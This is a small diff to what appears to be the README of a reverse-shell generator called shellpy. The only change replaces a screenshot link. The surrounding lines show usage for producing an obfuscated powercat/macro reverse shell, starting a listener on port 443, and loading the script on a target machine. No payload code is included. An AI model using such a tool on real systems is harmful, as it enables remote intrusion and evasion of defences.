@@ -40,8 +40,7 @@ shellpy <ip> <port> -powercat --obfuscate --macro
 ```bash
 python3 shell.py 443
 ```
-![image](https://github.com/user-attachments/assets/9863b3e7-6d33-4ce4-8974-f2a598920f9c)
-
+![image](https://github.com/user-attachments/assets/67107b56-050a-4de0-ac84-9be2bed95be6)
 
 3. Load the script on Target Machine
 
